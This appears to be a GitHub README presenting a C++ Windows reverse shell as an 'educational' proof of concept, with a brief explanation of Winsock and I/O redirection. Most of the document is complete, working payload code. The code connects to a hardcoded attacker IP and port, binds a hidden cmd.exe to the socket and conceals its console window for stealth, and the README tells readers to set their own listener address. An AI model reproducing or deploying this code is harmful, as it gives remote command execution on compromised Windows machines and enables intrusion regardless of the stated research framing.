# Win32-ReverseShell-Internal-Research 🛡️💻

A proof-of-concept (PoC) project demonstrating Windows API mechanics, Network Socket programming, and Process I/O redirection using C++. 

> **⚠️ DISCLAIMER: Educational and Research Purposes Only**
> This repository is created strictly for academic research, cybersecurity education, and defensive analysis (Blue Teaming). The author does not condone, encourage, or promote any malicious or illegal activities. Always obtain explicit permission before testing any network or system.

## 📌 Project Overview
This project explores how a reverse shell operates at the OS level on Windows. It demonstrates how to utilize the **Winsock API** to establish a TCP connection and how to hijack the standard input/output streams of a Windows process (`cmd.exe`) using the Win32 API. 

This is a fundamental concept in both offensive security (penetration testing) and defensive security (malware analysis and endpoint detection).

## 🧠 Core Logic & Mechanics

The execution flow of the program is divided into three main phases:

1. **Network Initialization (Winsock):** Uses `WSAStartup` to initialize the Windows Sockets DLL. Creates a TCP socket using `WSASocketA` and connects back to the listening machine via `WSAConnect`.
2. **I/O Redirection (The Pipe):** The `STARTUPINFO` structure is manipulated to redirect the standard streams of the command-line process. `hStdInput`, `hStdOutput`, and `hStdError` are assigned the handle of the established network socket.
3. **Process Creation:** Uses `CreateProcessA` to spawn `cmd.exe`. The `SW_HIDE` flag ensures the process runs invisibly in the background.

---

## 💻 1. The Payload (C++ Windows Reverse Shell)

Create a file named `reverse_shell.cpp` on your target/development machine:

```cpp
#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

void SpawnReverseShell(const char* remote_ip, int remote_port) {
    WSADATA wsaData;
    SOCKET winsocket;
    struct sockaddr_in server_addr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // 1. Initialize Windows Socket
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return; 

    // 2. Create Socket (TCP)
    winsocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (winsocket == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    // 3. Setup Server Address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(remote_port);
    inet_pton(AF_INET, remote_ip, &server_addr.sin_addr);

    // 4. Connect to Listener
    if (WSAConnect(winsocket, (SOCKADDR*)&server_addr, sizeof(server_addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(winsocket);
        WSACleanup();
        return;
    }

    // 5. I/O Redirection
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)winsocket;
    si.wShowWindow = SW_HIDE; // Stealth mode

    // 6. Execute CMD Process
    char cmd[] = "cmd.exe";
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        closesocket(winsocket);
        WSACleanup();
        return;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup Resources
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(winsocket);
    WSACleanup();
}

int main() {
    // [!] CHANGE TO YOUR LISTENER IP AND PORT
    const char* attacker_ip = "192.168.1.100"; 
    int port = 4444;

    // Hide the console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    SpawnReverseShell(attacker_ip, port);
    return 0;
}
